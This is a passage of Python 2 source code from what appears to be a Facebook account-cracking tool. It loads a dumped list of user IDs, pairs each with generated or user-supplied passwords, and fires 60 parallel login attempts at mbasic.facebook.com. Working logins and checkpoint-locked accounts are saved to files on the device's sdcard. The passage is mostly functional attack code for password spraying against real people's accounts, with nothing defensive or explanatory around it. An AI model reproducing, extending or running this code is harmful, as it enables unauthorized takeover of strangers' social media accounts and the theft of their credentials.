                self.pwlist()
                break
            elif f in ('n', 'N'):
                try:
                    while True:
                        try:
                            self.apk = raw_input(' [*] file dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\n %s[%s!%s] file dump is not available, dump id first\n' % (N, M, N)
                            time.sleep(3)
                            moch_yayan()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '\n %s[%s!%s] file dump is not available, dump id first\n' % (P, M, P)
                    time.sleep(3)
                    moch_yayan()

                print '\n [+] total id -> [%s%s%s%s]' % (P, M, len(self.fl), N)
                print '\n [#] ok results saved to : /sdcard/jutt/jutt-ok.txt'
                print ' [#] cp results saved to : /sdcard/jutt/jutt-cp.txt'
                print ' [!] press ctrl+z to stop the crack process\n'
                ThreadPool(60).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\n %s[%s#%s] crack done...' % (P, K, P)
                Crack_Done()
                exit()

    def pwlist(self):
        self.pw = raw_input(' [?] password : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\n [+] total id -> [%s%s%s%s]' % (P, M, len(self.fl), N)
            print '\n [#] ok results saved to : /sdcard/jutt/jutt-ok.txt'
            print ' [#] cp results saved to : /sdcard/jutt/jutt-cp.txt'
            print ' [!] press ctrl+z to stop the crack process\n'
            ThreadPool(60).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\n %s[%s#%s] crack done...' % (P, K, P)
            Crack_Done()
            exit()

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r  %s* --> %s<=>%s      %s' % (H, fl.get('id'), i, N)
                    self.ok.append(' [OK] %s<=>%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('/sdcard/jutt/jutt-ok.txt', 'a').write(' [OK] %s<=>%s\n\n' % (fl.get('id'), i))
                    ko = ' [OK] %s<=>%s\n\n' % (fl.get('id'), i)
                    break
                elif log.get('status') == 'cp':
                    print '\r  %s* --> %s<=>%s      %s' % (K, fl.get('id'), i, N)
                    self.cp.append(' [CP] %s<=>%s' % (fl.get('id'), i))
                    open('/sdcard/jutt/jutt-cp.txt', 'a').write(' [CP] %s<=>%s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.loop += 1
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w + ' [*] crack: %s/%s OK-:%s - CP-:%s%s ' % (self.loop, len(self.fl), len(self.ok), len(self.cp), N),
            sys.stdout.flush()
        except:
            self.main(fl)


if __name__ == '__main__':
    reg()
    notice()